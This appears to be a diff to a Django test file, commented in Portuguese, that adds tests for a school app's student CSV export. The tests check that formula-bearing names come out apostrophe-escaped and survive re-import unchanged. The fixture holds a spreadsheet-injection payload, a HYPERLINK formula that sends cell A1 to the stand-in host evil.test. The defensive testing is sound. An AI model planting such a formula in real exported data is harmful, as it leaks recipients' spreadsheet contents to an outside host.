@@ -12,6 +12,7 @@ inspeciona via `mail.outbox`).
 """
 from __future__ import annotations
 
+import csv
 import io
 from unittest.mock import patch
 
@@ -41,6 +42,11 @@ from apps.escola.views import (
 def _csv_bytes(linhas: list[str]) -> bytes:
     """Concatena linhas com `\n` e devolve bytes UTF-8 (com BOM)."""
     return ("﻿" + "\n".join(linhas)).encode("utf-8")
+
+
+# Fórmula que o Excel executaria ao abrir o arquivo. Ver
+# `apps/common/planilha.py`.
+FORMULA = '=HYPERLINK("http://evil.test?v="&A1,"Clique")'
 
 
 def _arquivo(nome: str, conteudo: bytes, content_type: str = "text/csv") -> SimpleUploadedFile:
@@ -214,6 +220,64 @@ class ExportTests(_Base):
     def test_export_formato_invalido_retorna_400(self):
         resp = self._get(AlunoViewSet, "export", query="formato=pdf")
         self.assertEqual(resp.status_code, 400)
+
+    def test_nome_com_formula_sai_como_texto(self):
+        """O nome pode ter vindo de uma importação de terceiro."""
+        Aluno.objects.create(
+            escola=self.escola_a,
+            turma=self.turma_a,
+            matricula="2026777",
+            nome_completo=FORMULA,
+            nome_responsavel="Resp",
+            email_responsavel="r@example.com",
+        )
+        resp = self._get(AlunoViewSet, "export", query="formato=csv")
+        self.assertEqual(resp.status_code, 200)
+        linhas = list(
+            csv.reader(
+                io.StringIO(resp.content.decode("utf-8-sig"))
+            )
+        )
+        celulas = [c for linha in linhas for c in linha]
+        self.assertIn(f"'{FORMULA}", celulas)
+        self.assertNotIn(FORMULA, celulas)
+
+    def test_round_trip_nao_acumula_o_apostrofo(self):
+        """Exportar, reimportar e exportar de novo tem que dar igual.
+
+        O import/export de migração é round-trip: sem a contraparte do
+        `desneutralizar`, o marcador que protegeu a célula na saída
+        seria gravado no banco na volta, e cada ciclo somaria mais um.
+        """
+        Aluno.objects.create(
+            escola=self.escola_a,
+            turma=self.turma_a,
+            matricula="2026778",
+            nome_completo=FORMULA,
+            nome_responsavel="Resp",
+            email_responsavel="r2@example.com",
+        )
+        primeiro = self._get(
+            AlunoViewSet, "export", query="formato=csv"
+        ).content.decode("utf-8-sig")
+
+        # Reimporta o arquivo exportado, confirmando.
+        arquivo = SimpleUploadedFile(
+            "alunos.csv",
+            primeiro.encode("utf-8"),
+            content_type="text/csv",
+        )
+        resp = self._post_upload(AlunoViewSet, arquivo, confirmar=True)
+        self.assertEqual(resp.status_code, 200, resp.data)
+
+        # O banco continua com o valor original, sem apóstrofo.
+        aluno = Aluno.objects.get(escola=self.escola_a, matricula="2026778")
+        self.assertEqual(aluno.nome_completo, FORMULA)
+
+        segundo = self._get(
+            AlunoViewSet, "export", query="formato=csv"
+        ).content.decode("utf-8-sig")
+        self.assertEqual(primeiro, segundo)
 
     def test_template_retorna_so_cabecalhos(self):
         resp = self._get(AlunoViewSet, "template", query="formato=csv")
